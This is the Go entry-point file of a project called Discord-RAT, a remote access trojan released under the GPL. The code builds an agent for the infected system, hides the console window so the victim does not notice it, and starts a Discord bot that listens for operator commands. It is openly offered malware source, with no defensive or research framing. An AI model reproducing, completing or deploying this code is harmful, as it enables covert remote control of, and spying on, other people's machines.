/*
 * This file is part of the Discord-RAT project.
 * Repository: https://github.com/codeuk/discord-rat
 *
 * Written by codeuk (github.com/codeuk)
 *
 * Discord-RAT is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Discord-RAT is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Discord-RAT. If not, see <https://www.gnu.org/licenses/>.
 */
package main

import (
	"github.com/codeuk/discord-rat/cmd/bot"
	"github.com/codeuk/discord-rat/pkg/agent"
	"github.com/codeuk/discord-rat/pkg/util"
	"github.com/codeuk/discord-rat/pkg/util/platforms"
)

var newAgent *agent.Agent

func init() {
	// Create a new agent for the current system.
	newAgent = agent.NewAgent()
}

func main() {
	if util.HideConsoleWindow {
		// Hide the console window (cross-platform).
		platforms.HideConsole()
	}

	// Initialize the Discord Bot and Session and listen for commands.
	bot.Init(newAgent)
}
